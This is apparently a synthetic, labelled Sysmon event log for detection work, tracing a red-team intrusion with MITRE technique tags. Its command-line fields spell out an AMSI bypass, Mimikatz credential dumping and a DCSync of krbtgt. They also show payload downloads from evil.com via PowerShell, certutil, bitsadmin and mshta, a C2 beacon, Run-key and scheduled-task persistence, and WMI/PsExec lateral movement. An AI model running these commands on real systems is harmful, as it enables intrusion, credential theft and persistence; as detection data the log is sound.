[
  {
    "Timestamp": "2024-06-15T08:00:01.123Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000001}",
    "ParentProcessGuid": "{a1b2c3d4-0000-0000-0000-000000000000}",
    "Image": "C:\\Windows\\explorer.exe", "ParentImage": "C:\\Windows\\System32\\userinit.exe",
    "CommandLine": "C:\\Windows\\explorer.exe", "ParentCommandLine": "C:\\Windows\\System32\\userinit.exe",
    "UserName": "CORP\\jsmith", "UserSID": "S-1-5-21-1234567890-1234567890-1234567890-1108",
    "LogonId": "0x5F2A1", "Hashes": "SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855",
    "Label": "Benign"
  },
  {
    "Timestamp": "2024-06-15T08:01:12.456Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000002}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000001}",
    "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\explorer.exe",
    "CommandLine": "cmd.exe /c whoami && ipconfig /all && systeminfo", "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "UserName": "CORP\\jsmith", "LogonId": "0x5F2A1",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1082", "AttackScenario": "Initial_Recon"
  },
  {
    "Timestamp": "2024-06-15T08:01:14.789Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000003}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000002}",
    "Image": "C:\\Windows\\System32\\whoami.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "whoami /all", "ParentCommandLine": "cmd.exe /c whoami && ipconfig /all && systeminfo",
    "UserName": "CORP\\jsmith", "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1082"
  },
  {
    "Timestamp": "2024-06-15T08:01:16.012Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000004}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000002}",
    "Image": "C:\\Windows\\System32\\ipconfig.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "ipconfig /all", "ParentCommandLine": "cmd.exe /c whoami && ipconfig /all && systeminfo",
    "UserName": "CORP\\jsmith", "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1082"
  },
  {
    "Timestamp": "2024-06-15T08:01:18.345Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000005}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000002}",
    "Image": "C:\\Windows\\System32\\systeminfo.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "systeminfo", "ParentCommandLine": "cmd.exe /c whoami && ipconfig /all && systeminfo",
    "UserName": "CORP\\jsmith", "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1082"
  },
  {
    "Timestamp": "2024-06-15T08:02:30.567Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000006}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000002}",
    "Image": "C:\\Windows\\System32\\net.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "net user /domain", "ParentCommandLine": "cmd.exe",
    "UserName": "CORP\\jsmith", "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1018"
  },
  {
    "Timestamp": "2024-06-15T08:02:35.890Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000007}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000002}",
    "Image": "C:\\Windows\\System32\\nltest.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "nltest /dclist:corp.local", "ParentCommandLine": "cmd.exe",
    "UserName": "CORP\\jsmith", "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1018"
  },
  {
    "Timestamp": "2024-06-15T08:05:00.111Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000008}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000002}",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxAA==",
    "ParentCommandLine": "cmd.exe",
    "UserName": "CORP\\jsmith",
    "Hashes": "SHA256=AABBCCDD1122334455667788AABBCCDD1122334455667788AABBCCDD11223344",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1059.001", "AttackScenario": "PowerShell_Cradle"
  },
  {
    "Timestamp": "2024-06-15T08:05:02.333Z", "EventID": 3, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000008}",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceIp": "10.10.1.50", "SourcePort": "49832",
    "DestinationIp": "185.220.101.42", "DestinationPort": "443",
    "Protocol": "tcp", "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1071.001"
  },
  {
    "Timestamp": "2024-06-15T08:06:10.555Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000009}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000008}",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "certutil.exe -urlcache -split -f http://evil.com/beacon.exe C:\\Users\\Public\\beacon.exe",
    "ParentCommandLine": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand ...",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1140", "AttackScenario": "Payload_Download"
  },
  {
    "Timestamp": "2024-06-15T08:06:12.777Z", "EventID": 3, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000009}",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "SourceIp": "10.10.1.50", "SourcePort": "49840",
    "DestinationIp": "185.220.101.42", "DestinationPort": "80",
    "Protocol": "tcp", "UserName": "CORP\\jsmith"
  },
  {
    "Timestamp": "2024-06-15T08:07:00.999Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000008}",
    "Image": "C:\\Users\\Public\\beacon.exe",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "C:\\Users\\Public\\beacon.exe --c2 185.220.101.42:443",
    "UserName": "CORP\\jsmith",
    "Hashes": "SHA256=DEADBEEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF12345678",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1204.002", "AttackScenario": "C2_Beacon"
  },
  {
    "Timestamp": "2024-06-15T08:07:05.111Z", "EventID": 3, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Users\\Public\\beacon.exe",
    "SourceIp": "10.10.1.50", "SourcePort": "49850",
    "DestinationIp": "185.220.101.42", "DestinationPort": "443",
    "Protocol": "tcp", "UserName": "CORP\\jsmith"
  },
  {
    "Timestamp": "2024-06-15T08:10:00.222Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000011}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\beacon.exe /f",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1547.001", "AttackScenario": "Persistence_RegKey"
  },
  {
    "Timestamp": "2024-06-15T08:10:02.444Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000012}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000011}",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\Public\\beacon.exe /f",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1547.001"
  },
  {
    "Timestamp": "2024-06-15T08:12:00.666Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000013}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "schtasks /create /tn WindowsUpdate /tr C:\\Users\\Public\\beacon.exe /sc hourly /ru SYSTEM",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1053.005", "AttackScenario": "Persistence_ScheduledTask"
  },
  {
    "Timestamp": "2024-06-15T08:15:00.888Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000014}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "powershell.exe -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX(New-Object Net.WebClient).DownloadString('http://evil.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1003.001", "AttackScenario": "Credential_Dump"
  },
  {
    "Timestamp": "2024-06-15T08:15:05.111Z", "EventID": 3, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000014}",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceIp": "10.10.1.50", "SourcePort": "49870",
    "DestinationIp": "185.220.101.42", "DestinationPort": "80",
    "Protocol": "tcp"
  },
  {
    "Timestamp": "2024-06-15T08:20:00.333Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000015}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "powershell.exe -c \"Invoke-Command -ComputerName WIN-DC01 -ScriptBlock { whoami; hostname }\"",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1021.006", "AttackScenario": "Lateral_WinRM"
  },
  {
    "Timestamp": "2024-06-15T08:20:05.555Z", "EventID": 3, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000015}",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceIp": "10.10.1.50", "SourcePort": "49880",
    "DestinationIp": "10.10.1.10", "DestinationPort": "5985",
    "Protocol": "tcp"
  },
  {
    "Timestamp": "2024-06-15T08:22:00.777Z", "EventID": 4624, "Provider": "Microsoft-Windows-Security-Auditing",
    "HostName": "WIN-DC01", "HostIP": "10.10.1.10",
    "ProcessGuid": "{b2c3d4e5-0001-0001-0001-000000000001}",
    "UserName": "CORP\\jsmith", "UserSID": "S-1-5-21-1234567890-1234567890-1234567890-1108",
    "LogonId": "0x7A3B2", "LogonType": "3",
    "SourceIp": "10.10.1.50", "SourcePort": "49880",
    "Label": "Malicious_RedTeam", "AttackScenario": "Lateral_Movement"
  },
  {
    "Timestamp": "2024-06-15T08:25:00.999Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-DC01", "HostIP": "10.10.1.10",
    "ProcessGuid": "{b2c3d4e5-0001-0001-0001-000000000002}",
    "ParentProcessGuid": "{b2c3d4e5-0001-0001-0001-000000000001}",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentImage": "C:\\Windows\\System32\\wsmprovhost.exe",
    "CommandLine": "powershell.exe -c \"lsadump::dcsync /domain:corp.local /user:krbtgt\"",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1003.006", "AttackScenario": "DCSync_Attack"
  },
  {
    "Timestamp": "2024-06-15T08:25:03.111Z", "EventID": 4662, "Provider": "Microsoft-Windows-Security-Auditing",
    "HostName": "WIN-DC01", "HostIP": "10.10.1.10",
    "ProcessGuid": "{b2c3d4e5-0001-0001-0001-000000000003}",
    "UserName": "CORP\\jsmith",
    "CommandLine": "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1003.006", "AttackScenario": "DCSync_Attack"
  },
  {
    "Timestamp": "2024-06-15T08:30:00.333Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000016}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\mshta.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "mshta.exe javascript:a=GetObject(\"script:http://evil.com/payload.sct\").Exec()",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1218.005", "AttackScenario": "LOLBAS_MSHTA"
  },
  {
    "Timestamp": "2024-06-15T08:35:00.555Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS02", "HostIP": "10.10.1.51",
    "ProcessGuid": "{c3d4e5f6-0001-0001-0001-000000000001}",
    "ParentProcessGuid": "{c3d4e5f6-0000-0000-0000-000000000000}",
    "Image": "C:\\Windows\\System32\\services.exe",
    "CommandLine": "C:\\Windows\\System32\\services.exe",
    "UserName": "NT AUTHORITY\\SYSTEM",
    "Label": "Benign"
  },
  {
    "Timestamp": "2024-06-15T08:35:05.777Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS02", "HostIP": "10.10.1.51",
    "ProcessGuid": "{c3d4e5f6-0001-0001-0001-000000000002}",
    "ParentProcessGuid": "{c3d4e5f6-0001-0001-0001-000000000001}",
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "CommandLine": "cmd.exe /c C:\\Users\\Public\\psexesvc.exe",
    "UserName": "CORP\\admin_lateral",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1021.002", "AttackScenario": "PsExec_Lateral"
  },
  {
    "Timestamp": "2024-06-15T08:35:08.999Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS02", "HostIP": "10.10.1.51",
    "ProcessGuid": "{c3d4e5f6-0001-0001-0001-000000000003}",
    "ParentProcessGuid": "{c3d4e5f6-0001-0001-0001-000000000002}",
    "Image": "C:\\Users\\Public\\psexesvc.exe",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "C:\\Users\\Public\\psexesvc.exe",
    "UserName": "CORP\\admin_lateral",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1021.002"
  },
  {
    "Timestamp": "2024-06-15T08:40:00.111Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000017}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\wmic.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "wmic /node:WIN-WS02 process call create \"cmd.exe /c C:\\Users\\Public\\beacon.exe\"",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1047", "AttackScenario": "WMI_Lateral"
  },
  {
    "Timestamp": "2024-06-15T08:40:02.333Z", "EventID": 3, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000017}",
    "Image": "C:\\Windows\\System32\\wmic.exe",
    "SourceIp": "10.10.1.50", "SourcePort": "49900",
    "DestinationIp": "10.10.1.51", "DestinationPort": "135",
    "Protocol": "tcp"
  },
  {
    "Timestamp": "2024-06-15T08:45:00.555Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000018}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\sc.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "sc \\\\WIN-WS02 create RemoteSvc binPath= C:\\Users\\Public\\beacon.exe start= auto",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1543.003", "AttackScenario": "Remote_Service"
  },
  {
    "Timestamp": "2024-06-15T08:50:00.777Z", "EventID": 1, "Provider": "Microsoft-Windows-Sysmon",
    "HostName": "WIN-WS01", "HostIP": "10.10.1.50",
    "ProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000019}",
    "ParentProcessGuid": "{a1b2c3d4-0001-0001-0001-000000000010}",
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "ParentImage": "C:\\Users\\Public\\beacon.exe",
    "CommandLine": "bitsadmin /transfer evil /download /priority high http://evil.com/stage2.exe C:\\Users\\Public\\stage2.exe",
    "UserName": "CORP\\jsmith",
    "Label": "Malicious_RedTeam", "MITRE_TechniqueId": "T1197", "AttackScenario": "BITS_Download"
  }
]
